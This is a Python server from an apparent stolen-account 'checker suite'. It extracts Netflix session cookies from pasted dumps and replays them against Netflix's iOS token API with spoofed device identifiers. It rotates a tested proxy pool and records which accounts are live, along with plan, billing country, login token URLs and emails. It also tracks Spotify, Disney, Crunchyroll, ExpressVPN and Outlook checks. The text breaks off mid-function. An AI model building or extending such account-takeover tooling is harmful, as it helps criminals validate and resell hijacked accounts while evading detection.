import csv
import hmac
import http.server
import io
import json
import logging
import os
import random
import re
import socketserver
import sqlite3
import threading
import time
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime
import concurrent.futures
import platform
import requests
from expressvpn_checker import check_expressvpn_account

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PORT = int(os.environ.get("PORT", 8080))
PROXIES_FILE = os.path.join(BASE_DIR, "netflix_proxies.txt")
DB_FILE = os.path.join(BASE_DIR, "netflix_suite.db")
CONFIG_FILE = os.path.join(BASE_DIR, "suite_config.json")
LOG_FILE = os.path.join(BASE_DIR, "suite.log")
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")

COUNTRY_CODE_NAMES = {
    'AR': 'Argentina', 'AU': 'Australia', 'BR': 'Brazil', 'CA': 'Canada',
    'DE': 'Germany', 'ES': 'Spain', 'FR': 'France', 'GB': 'United Kingdom',
    'ID': 'Indonesia', 'IN': 'India', 'IT': 'Italy', 'JP': 'Japan',
    'KR': 'South Korea', 'MY': 'Malaysia', 'MX': 'Mexico', 'NL': 'Netherlands',
    'PH': 'Philippines', 'SG': 'Singapore', 'TH': 'Thailand', 'TR': 'Turkey',
    'US': 'United States', 'VN': 'Vietnam',
}

def extract_cookie_values(text):
    cookie_dict = {}
    if not text:
        return cookie_dict

    text = str(text).strip()

    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n, v = c.get("name"), c.get("value")
                        if n in COOKIE_KEYS and isinstance(v, str):
                            cookie_dict[n] = urllib.parse.unquote(v) if "%" in v else v
        except Exception:
            pass

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#") or line.startswith("═") or line.startswith("█") or line.startswith("–"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookie_dict[parts[5]] = parts[6]

    try:
        data = json.loads(text)
    except Exception:
        data = None

    if isinstance(data, list):
        for c in data:
            if isinstance(c, dict):
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    cookie_dict[n] = urllib.parse.unquote(v) if "%" in v else v
    elif isinstance(data, dict):
        for k in COOKIE_KEYS:
            v = data.get(k)
            if isinstance(v, str):
                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v

    for k in COOKIE_KEYS:
        if k not in cookie_dict:
            m = re.search(rf"(?:•\s*Cookie:\s*|[;\s]|^){re.escape(k)}=([^;,\r\n\s]+)", text)
            if m:
                v = m.group(1)
                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v

    for k in list(cookie_dict.keys()):
        if isinstance(cookie_dict[k], str):
            cookie_dict[k] = cookie_dict[k].strip().rstrip('.')

    return cookie_dict

def get_cookie_fingerprint(text):
    if not text:
        return ""
    ck = extract_cookie_values(text)
    nid = ck.get("NetflixId", "")
    if nid:
        ct_m = re.search(r'ct=([^&]+)', nid)
        if ct_m:
            return f"ct:{ct_m.group(1)}"
        return f"nid:{nid.strip()}"
    cleaned = re.sub(r'\s+', '', str(text).strip())
    return f"raw:{cleaned[:120]}"

db_lock = threading.Lock()
healthy_proxies = []
all_tested_proxies = []
proxy_lock = threading.Lock()
server_start_time = time.time()

# ── Proxy Testing State & Cache ─────────────────────────────────────────────
proxy_test_state = {
    "running": False,
    "stop_requested": False,
    "total": 0,
    "tested": 0,
    "healthy": 0,
    "dead": 0,
    "speed": 0,
    "eta_seconds": 0,
    "start_time": 0,
    "last_result": None
}
proxy_test_lock = threading.Lock()
cached_proxies = []
cached_proxies_mtime = 0
cached_proxies_lock = threading.Lock()

def get_config():
    defaults = {"api_key": "", "allow_cors_origins": [], "rate_limits": {"checker": 200, "admin": 50}, "security": {"max_body_size_mb": 10}}
    if not os.path.exists(CONFIG_FILE):
        return defaults
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            c = json.load(f)
            merged = {**defaults, **c}
            return merged
    except Exception:
        return defaults

def save_config(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)

def get_db():
    conn = sqlite3.connect(DB_FILE, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL;")
    return conn

def init_db():
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                created_at TEXT,
                type TEXT,
                status TEXT,
                plan TEXT,
                billing TEXT,
                country TEXT,
                route TEXT,
                token_url TEXT,
                raw_cookie TEXT,
                cookie_key TEXT
            )
        ''')
        c.execute("PRAGMA table_info(history)")
        cols = [r[1] for r in c.fetchall()]
        if "cookie_key" not in cols:
            c.execute("ALTER TABLE history ADD COLUMN cookie_key TEXT")
        if "email" not in cols:
            c.execute("ALTER TABLE history ADD COLUMN email TEXT DEFAULT ''")
        c.execute("CREATE INDEX IF NOT EXISTS idx_history_cookie_key ON history(cookie_key)")

        c.execute('''
            CREATE TABLE IF NOT EXISTS proxy_cache (
                proxy_key TEXT PRIMARY KEY,
                status TEXT,
                latency INTEGER DEFAULT 0,
                last_tested REAL DEFAULT 0
            )
        ''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_proxy_status ON proxy_cache(status)")

        c.execute('''
            CREATE TABLE IF NOT EXISTS api_keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT UNIQUE NOT NULL,
                label TEXT DEFAULT '',
                created_at TEXT,
                last_used TEXT,
                is_active INTEGER DEFAULT 1
            )
        ''')

        # Auto-insert master key from config if no keys exist
        c.execute('SELECT COUNT(*) FROM api_keys')
        if c.fetchone()[0] == 0:
            cfg = get_config()
            master_key = cfg.get('api_key', '')
            if master_key:
                c.execute('INSERT INTO api_keys (key, label, created_at, is_active) VALUES (?, ?, ?, 1)',
                          (master_key, 'Master Key', datetime.now().strftime('%Y-%m-%d %H:%M:%S')))

        conn.commit()
        conn.close()

def get_cached_proxy_states():
    with db_lock:
        try:
            conn = get_db()
            c = conn.cursor()
            c.execute("SELECT proxy_key, status, latency, last_tested FROM proxy_cache")
            rows = c.fetchall()
            conn.close()
            return {r[0]: {"status": r[1], "latency": r[2], "last_tested": r[3]} for r in rows}
        except Exception as e:
            logging.error(f"Error reading proxy_cache: {e}")
            return {}

def update_cached_proxy_state(proxy_key, status, latency=0):
    if not proxy_key:
        return
    with db_lock:
        try:
            conn = get_db()
            c = conn.cursor()
            now = time.time()
            c.execute("""
                INSERT INTO proxy_cache (proxy_key, status, latency, last_tested)
                VALUES (?, ?, ?, ?)
                ON CONFLICT(proxy_key) DO UPDATE SET
                    status=excluded.status,
                    latency=excluded.latency,
                    last_tested=excluded.last_tested
            """, (proxy_key, status, latency, now))
            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"Error updating proxy_cache: {e}")

def batch_update_cached_proxy_states(items):
    if not items:
        return
    with db_lock:
        try:
            conn = get_db()
            c = conn.cursor()
            now = time.time()
            data = [(k, s, l, now) for (k, s, l) in items if k]
            c.executemany("""
                INSERT INTO proxy_cache (proxy_key, status, latency, last_tested)
                VALUES (?, ?, ?, ?)
                ON CONFLICT(proxy_key) DO UPDATE SET
                    status=excluded.status,
                    latency=excluded.latency,
                    last_tested=excluded.last_tested
            """, data)
            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"Error batch updating proxy_cache: {e}")

def delete_from_proxy_cache(keys):
    if not keys:
        return
    with db_lock:
        try:
            conn = get_db()
            c = conn.cursor()
            k_list = list(keys)
            batch_size = 500
            for i in range(0, len(k_list), batch_size):
                chunk = k_list[i:i+batch_size]
                placeholders = ",".join(["?"] * len(chunk))
                c.execute(f"DELETE FROM proxy_cache WHERE proxy_key IN ({placeholders})", chunk)
            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"Error deleting from proxy_cache: {e}")

def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie='', email=''):
    with db_lock:
        try:
            conn = get_db()
            c = conn.cursor()
            key = get_cookie_fingerprint(raw_cookie)
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            existing = None
            if key:
                c.execute('SELECT id, plan, billing, country, token_url FROM history WHERE cookie_key = ? ORDER BY id DESC LIMIT 1', (key,))
                existing = c.fetchone()
            if not existing and raw_cookie:
                c.execute('SELECT id, plan, billing, country, token_url FROM history WHERE raw_cookie = ? ORDER BY id DESC LIMIT 1', (raw_cookie,))
                existing = c.fetchone()

            if existing:
                existing_id, ex_plan, ex_billing, ex_country, ex_token = existing
                final_plan = plan if plan else ex_plan
                final_billing = billing if billing else (ex_billing if status != 'DEAD' else '')
                final_country = country if country else ex_country
                final_token = token_url if token_url else (ex_token if status in ('LIVE', 'HOLD', 'FREE') else '')

                c.execute('''
                    UPDATE history
                    SET created_at = ?,
                        type = ?,
                        status = ?,
                        plan = ?,
                        billing = ?,
                        country = ?,
                        route = ?,
                        token_url = ?,
                        raw_cookie = ?,
                        cookie_key = ?,
                        email = ?
                    WHERE id = ?
                ''', (
                    now, entry_type, status, final_plan, final_billing,
                    final_country, route, final_token, raw_cookie, key, email,
                    existing_id
                ))
                if key:
                    c.execute('DELETE FROM history WHERE cookie_key = ? AND id != ?', (key, existing_id))
                logging.info(f"Update history [ID {existing_id}]: [{entry_type}] {status} - Plan: {final_plan} - Country: {final_country}")
            else:
                c.execute('''
                    INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie, cookie_key, email)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    now, entry_type, status, plan, billing, country,
                    route, token_url, raw_cookie, key, email
                ))
                logging.info(f"Save history: [{entry_type}] {status} - Plan: {plan} - Country: {country}")

            conn.commit()
            conn.close()
        except Exception as e:
            logging.error(f"Error saving history: {e}")

def get_history(limit=50, offset=0, search='', status='', plan='', entry_type=''):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie, email FROM history WHERE 1=1'
        params = []

        if search:
            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ? OR email LIKE ?)'
            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
        if status:
            query += ' AND status = ?'
            params.append(status)
        if entry_type:
            query += ' AND type = ?'
            params.append(entry_type)
        if plan:
            p_upper = plan.upper()
            if p_upper in ('PREMIUM', '4K'):
                query += ' AND (plan LIKE "%4K%" OR plan LIKE "%ULTRA%" OR plan LIKE "%PREMIUM%")'
            elif p_upper == 'STANDARD':
                query += ' AND (plan LIKE "%STANDARD%" OR plan LIKE "%STANDAR%")'
            elif p_upper == 'BASIC':
                query += ' AND (plan LIKE "%BASIC%" OR plan LIKE "%DASAR%")'
            elif p_upper == 'MOBILE':
                query += ' AND (plan LIKE "%MOBILE%" OR plan LIKE "%PONSEL%")'
            elif p_upper == 'SPOTIFY':
                query += ' AND (plan LIKE "%Spotify%")'
            elif p_upper == 'DISNEY':
                query += ' AND (plan LIKE "%Disney%")'
            elif p_upper == 'CRUNCHYROLL':
                query += ' AND (plan LIKE "%Crunchyroll%")'
            elif p_upper == 'EXPRESSVPN':
                query += ' AND (plan LIKE "%ExpressVPN%")'
            elif p_upper == 'FAMILY':
                query += ' AND (plan LIKE "%Family%" OR plan LIKE "%Duo%")'
            elif p_upper == 'STUDENT':
                query += ' AND (plan LIKE "%Student%")'
            else:
                query += ' AND plan LIKE ?'
                params.append(f'%{plan}%')

        # Count total
        count_query = 'SELECT COUNT(*) FROM (' + query + ')'
        c.execute(count_query, params)
        total = c.fetchone()[0]

        query += ' ORDER BY id DESC LIMIT ? OFFSET ?'
        params.extend([limit, offset])

        c.execute(query, params)
        rows = c.fetchall()
        conn.close()

        items = [
            {
                "id": r[0], "created_at": r[1], "type": r[2], "status": r[3],
                "plan": r[4], "billing": r[5], "country": r[6], "route": r[7],
                "token_url": r[8], "raw_cookie": r[9], "email": r[10] or ""
            }
            for r in rows
        ]
        return {"total": total, "items": items}

def export_history_csv(search='', status='', plan='', entry_type=''):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie, email FROM history WHERE 1=1'
        params = []
        if search:
            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ? OR email LIKE ?)'
            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
        if status:
            query += ' AND status = ?'
            params.append(status)
        if entry_type:
            query += ' AND type = ?'
            params.append(entry_type)
        if plan:
            p_upper = plan.upper()
            if p_upper in ('PREMIUM', '4K'):
                query += ' AND (plan LIKE "%4K%" OR plan LIKE "%ULTRA%" OR plan LIKE "%PREMIUM%")'
            elif p_upper == 'STANDARD':
                query += ' AND (plan LIKE "%STANDARD%" OR plan LIKE "%STANDAR%")'
            elif p_upper == 'BASIC':
                query += ' AND (plan LIKE "%BASIC%" OR plan LIKE "%DASAR%")'
            elif p_upper == 'MOBILE':
                query += ' AND (plan LIKE "%MOBILE%" OR plan LIKE "%PONSEL%")'
            elif p_upper == 'SPOTIFY':
                query += ' AND (plan LIKE "%Spotify%")'
            elif p_upper == 'DISNEY':
                query += ' AND (plan LIKE "%Disney%")'
            elif p_upper == 'CRUNCHYROLL':
                query += ' AND (plan LIKE "%Crunchyroll%")'
            elif p_upper == 'EXPRESSVPN':
                query += ' AND (plan LIKE "%ExpressVPN%")'
            elif p_upper == 'FAMILY':
                query += ' AND (plan LIKE "%Family%" OR plan LIKE "%Duo%")'
            elif p_upper == 'STUDENT':
                query += ' AND (plan LIKE "%Student%")'
            else:
                query += ' AND plan LIKE ?'
                params.append(f'%{plan}%')
        query += ' ORDER BY id DESC'
        c.execute(query, params)
        rows = c.fetchall()
        conn.close()

        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["ID", "Waktu", "Service", "Status", "Plan", "Billing", "Negara", "Route", "Token URL", "Raw Cookie", "Email"])
        for r in rows:
            safe_row = []
            for cell in r:
                s = str(cell) if cell is not None else ""
                if s and s[0] in ("=", "+", "-", "@", "\t", "\r"):
                    s = "'" + s
                safe_row.append(s)
            writer.writerow(safe_row)
        return output.getvalue()

def get_analytics():
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT status, COUNT(*) FROM history GROUP BY status')
        status_counts = dict(c.fetchall())
        c.execute('SELECT country, COUNT(*) FROM history WHERE country != "" AND country != "Unknown" GROUP BY country ORDER BY COUNT(*) DESC LIMIT 8')
        country_counts = dict(c.fetchall())
        c.execute('SELECT plan, COUNT(*) FROM history WHERE (status = "LIVE" OR status = "HOLD") AND plan != "" GROUP BY plan ORDER BY COUNT(*) DESC LIMIT 6')
        plan_counts = dict(c.fetchall())

        # Aggregate per-service metrics for Dashboard & Hub
        c.execute('SELECT type, status, COUNT(*) FROM history GROUP BY type, status')
        rows = c.fetchall()

        services = {}
        for r_type, r_status, count in rows:
            st = (r_status or "").upper()
            t = (r_type or "").lower()
            if t in ('checker', 'single', 'bulk', 'netflix'):
                t = 'netflix'
            elif t in ('hotmail', 'outlook'):
                t = 'outlook'

            if t not in services:
                services[t] = {"checks": 0, "live": 0, "bad": 0, "hold": 0}
            services[t]["checks"] += count
            if st in ('LIVE', 'PREMIUM', 'FREE'):
                services[t]["live"] += count
            elif st in ('BAD', 'DEAD', 'ERROR'):
                services[t]["bad"] += count
            else:
                services[t]["hold"] += count

        conn.close()
        return {
            "status_counts": status_counts,
            "country_counts": country_counts,
            "plan_counts": plan_counts,
            "services": services
        }

def clear_history(only_dead=False):
    with db_lock:
        conn = get_db()
        c = conn.cursor()
        if only_dead:
            c.execute('DELETE FROM history WHERE status = "DEAD" OR status = "ERROR" OR status = "BAD" OR status = "LOCKED" OR status = "PHONE_LOCKED"')
            logging.info("Deleted only DEAD/ERROR/BAD/LOCKED history records.")
        else:
            c.execute('DELETE FROM history')
            logging.info("History database cleared completely.")
        conn.commit()
        conn.close()

def parse_single_proxy(line):
    p = line.strip()
    if not p or p.startswith("#"):
        return None
    scheme = None
    if "://" in p:
        scheme, remainder = p.split("://", 1)
        scheme = scheme.lower()
    else:
        remainder = p

    # Default scheme is http if not specified
    actual_scheme = scheme or "http"

    # Format user:pass@ip:port
    if "@" in remainder:
        auth_part, netloc = remainder.split("@", 1)
        netloc_parts = netloc.split(":")
        if len(netloc_parts) >= 2:
            raw = f"{netloc_parts[0]}:{netloc_parts[1]}"
        else:
            raw = f"{netloc}:80"
        proxy = f"{actual_scheme}://{auth_part}@{netloc}"
        return {"raw": raw, "proxy": proxy, "line": p, "latency": 0, "status": "OK"}

    parts = remainder.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return {"raw": f"{ip}:{port}", "proxy": f"{actual_scheme}://{user}:{pwd}@{ip}:{port}", "line": p, "latency": 0, "status": "OK"}
    elif len(parts) == 2:
        ip, port = parts
        return {"raw": f"{ip}:{port}", "proxy": f"{actual_scheme}://{ip}:{port}", "line": p, "latency": 0, "status": "OK"}
    return None

def load_proxies(force_reload=False):
    global cached_proxies, cached_proxies_mtime, healthy_proxies, all_tested_proxies
    if not os.path.exists(PROXIES_FILE):
        return []
    try:
        mtime = os.path.getmtime(PROXIES_FILE)
        with cached_proxies_lock:
            if not force_reload and cached_proxies and mtime == cached_proxies_mtime:
                return [dict(p) for p in cached_proxies]
            
            db_states = get_cached_proxy_states()
            res = []
            with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for idx, line in enumerate(f):
                    item = parse_single_proxy(line)
                    if item:
                        item["id"] = idx + 1
                        k = item.get("line") or item.get("proxy") or item.get("raw")
                        cached = db_states.get(k) or db_states.get(item.get("raw")) or db_states.get(item.get("proxy"))
                        if cached:
                            item["status"] = cached["status"]
                            item["latency"] = cached["latency"]
                            item["last_tested"] = cached.get("last_tested", 0)
                        else:
                            item["status"] = "UNVERIFIED"
                            item["latency"] = 0
                            item["last_tested"] = 0
                        res.append(item)
            cached_proxies = res
            cached_proxies_mtime = mtime
            with proxy_lock:
                all_tested_proxies = list(res)
                healthy_proxies = [p for p in res if p.get("status") == "OK"]
            return [dict(p) for p in res]
    except Exception as e:
        logging.error(f"Error loading proxies: {e}")
        return []

def check_proxy_health(p, timeout=(3.0, 4.0), retries=1):
    prx = p.get("proxy") if isinstance(p, dict) else str(p)
    if not prx:
        return False, 0
    proxies = {"http": prx, "https": prx}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "*/*"
    }
    for attempt in range(retries + 1):
        t0 = time.time()
        try:
            to = timeout if attempt == 0 else (3.5, 5.0)
            r = requests.get("https://www.netflix.com/favicon.ico", proxies=proxies, timeout=to, verify=True, headers=headers)
            if r.status_code in (200, 301, 302, 404):
                latency = int((time.time() - t0) * 1000)
                return True, latency
        except Exception:
            pass
        if attempt < retries:
            time.sleep(0.2)
    return False, 0

def test_single_proxy_func(proxy_str):
    global healthy_proxies, all_tested_proxies
    item = parse_single_proxy(proxy_str)
    if not item:
        item = {"raw": proxy_str, "proxy": f"http://{proxy_str}", "line": proxy_str, "latency": 0, "status": "UNVERIFIED"}
    ok, lat = check_proxy_health(item, timeout=(3.0, 4.5), retries=1)
    item["status"] = "OK" if ok else "FAIL"
    item["latency"] = lat if ok else 0
    k = item.get("line") or item.get("proxy") or item.get("raw")
    update_cached_proxy_state(k, item["status"], item["latency"])

    with proxy_lock:
        if not all_tested_proxies:
            all_tested_proxies = list(load_proxies())
        found = False
        for p in all_tested_proxies:
            pk = p.get("line") or p.get("proxy") or p.get("raw")
            if pk == k or p.get("raw") == item.get("raw"):
                p["status"] = item["status"]
                p["latency"] = item["latency"]
                found = True
                break
        if not found:
            all_tested_proxies.append(item)
        healthy_proxies = [p for p in all_tested_proxies if p.get("status") == "OK"]
    return ok, lat, item

def stop_background_proxy_test():
    global proxy_test_state
    with proxy_test_lock:
        if proxy_test_state["running"]:
            proxy_test_state["stop_requested"] = True
            return True, "Menghentikan pengujian proxy..."
        return False, "Tidak ada pengujian yang sedang berjalan"

def start_background_proxy_test(limit=100, mode="untested"):
    global proxy_test_state, healthy_proxies, all_tested_proxies
    with proxy_test_lock:
        if proxy_test_state["running"]:
            return False, "Test proxy sedang berlangsung di background"
        proxy_test_state["running"] = True
        proxy_test_state["stop_requested"] = False
        proxy_test_state["start_time"] = time.time()
        proxy_test_state["tested"] = 0
        proxy_test_state["healthy"] = 0
        proxy_test_state["dead"] = 0
        proxy_test_state["speed"] = 0
        proxy_test_state["eta_seconds"] = 0

    def _worker():
        global healthy_proxies, all_tested_proxies
        try:
            with proxy_lock:
                current_pool = list(all_tested_proxies) if all_tested_proxies else load_proxies()
            
            if mode == "untested":
                candidates = [p for p in current_pool if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY")]
                if not candidates:
                    candidates = current_pool
            elif mode == "dead":
                candidates = [p for p in current_pool if p.get("status") == "FAIL"]
            else: # "all"
                candidates = list(current_pool)

            if limit and limit > 0:
                candidates = candidates[:limit]

            total_cand = len(candidates)
            with proxy_test_lock:
                proxy_test_state["total"] = total_cand

            tested_map = {}
            db_batch = []
            db_batch_lock = threading.Lock()

            def _test_item(p):
                with proxy_test_lock:
                    if proxy_test_state.get("stop_requested"):
                        return None

                ok, lat = check_proxy_health(p, timeout=(3.0, 4.0), retries=1)
                p_copy = dict(p)
                p_copy["latency"] = lat if ok else 0
                p_copy["status"] = "OK" if ok else "FAIL"
                p_copy["last_tested"] = time.time()

                k = p_copy.get("line") or p_copy.get("proxy") or p_copy.get("raw")
                with db_batch_lock:
                    db_batch.append((k, p_copy["status"], p_copy["latency"]))
                    if len(db_batch) >= 50:
                        batch_update_cached_proxy_states(list(db_batch))
                        db_batch.clear()

                with proxy_test_lock:
                    proxy_test_state["tested"] += 1
                    if ok:
                        proxy_test_state["healthy"] += 1
                    else:
                        proxy_test_state["dead"] += 1
                    
                    elapsed = max(0.1, time.time() - proxy_test_state["start_time"])
                    speed = proxy_test_state["tested"] / elapsed
                    proxy_test_state["speed"] = round(speed, 1)
                    rem_items = max(0, total_cand - proxy_test_state["tested"])
                    proxy_test_state["eta_seconds"] = int(rem_items / speed) if speed > 0 else 0

                return p_copy

            max_workers = min(100, max(20, total_cand // 5 or 20))
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
                results = list(ex.map(_test_item, candidates))

            with db_batch_lock:
                if db_batch:
                    batch_update_cached_proxy_states(db_batch)
                    db_batch.clear()

            for r in results:
                if r:
                    k = r.get("line") or r.get("proxy") or r.get("raw")
                    tested_map[k] = r

            with proxy_lock:
                updated_all = []
                for p in current_pool:
                    k = p.get("line") or p.get("proxy") or p.get("raw")
                    if k in tested_map:
                        updated_all.append(tested_map[k])
                    else:
                        updated_all.append(p)
                all_tested_proxies = updated_all
                healthy_proxies = [p for p in updated_all if p.get("status") == "OK"]
        except Exception as ex:
            logging.error(f"Proxy test worker error: {ex}")
        finally:
            with proxy_test_lock:
                proxy_test_state["running"] = False
                proxy_test_state["last_result"] = {
                    "tested": proxy_test_state["tested"],
                    "healthy": proxy_test_state["healthy"],
                    "dead": proxy_test_state["dead"],
                    "elapsed": int(time.time() - proxy_test_state["start_time"])
                }

    threading.Thread(target=_worker, daemon=True).start()
    lim_label = "semua" if (not limit or limit <= 0) else f"{limit}"
    return True, f"Menjalankan benchmark test untuk {lim_label} proxy dengan high-concurrency engine..."

def clean_dead_proxies_serverside():
    global healthy_proxies, all_tested_proxies
    with proxy_lock:
        dead_keys = set()
        for p in all_tested_proxies:
            if p.get("status") == "FAIL":
                if p.get("line"): dead_keys.add(p["line"].strip())
                if p.get("raw"): dead_keys.add(p["raw"].strip())
                if p.get("proxy"): dead_keys.add(p["proxy"].strip())

        if not dead_keys:
            all_p = all_tested_proxies if all_tested_proxies else load_proxies()
            return 0, len(all_p)

        delete_from_proxy_cache(dead_keys)

        remaining = []
        removed = 0
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    s = line.strip()
                    if not s or s.startswith("#"):
                        remaining.append(s)
                        continue
                    parsed = parse_single_proxy(s)
                    is_dead = (s in dead_keys) or (parsed and (parsed.get("raw") in dead_keys or parsed.get("proxy") in dead_keys))
                    if is_dead:
                        removed += 1
                    else:
                        remaining.append(s)
            with open(PROXIES_FILE, "w", encoding="utf-8") as f:
                f.write("\n".join(remaining) + "\n")

        all_tested_proxies = [p for p in all_tested_proxies if p.get("status") != "FAIL"]
        healthy_proxies = [p for p in all_tested_proxies if p.get("status") == "OK"]
        load_proxies(force_reload=True)
        return removed, len(remaining)

def remove_proxies_flexible(target_set):
    global healthy_proxies, all_tested_proxies
    remaining = []
    removed = 0
    delete_from_proxy_cache(target_set)
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                s = line.strip()
                if not s or s.startswith("#"):
                    remaining.append(s)
                    continue
                parsed = parse_single_proxy(s)
                matched = (s in target_set) or (parsed and (parsed.get("raw") in target_set or parsed.get("proxy") in target_set))
                if matched:
                    removed += 1
                else:
                    remaining.append(s)
        with open(PROXIES_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(remaining) + "\n")

    with proxy_lock:
        all_tested_proxies.clear()
        healthy_proxies.clear()
    load_proxies(force_reload=True)
    return removed, len(remaining)

def proxy_health_worker():
    global healthy_proxies, all_tested_proxies
    time.sleep(3)
    # Quick initial warmup if healthy pool is empty or low
    try:
        with proxy_lock:
            h_len = len(healthy_proxies)
        if h_len < 10:
            start_background_proxy_test(limit=250, mode="untested")
    except Exception as e:
        logging.error(f"Proxy warmup error: {e}")

    while True:
        try:
            # Run balanced health balancing every 90 seconds in gentle batches
            time.sleep(90)

            # Skip auto-cycle if manual batch test is active
            with proxy_test_lock:
                if proxy_test_state.get("running"):
                    continue

            with proxy_lock:
                if not all_tested_proxies:
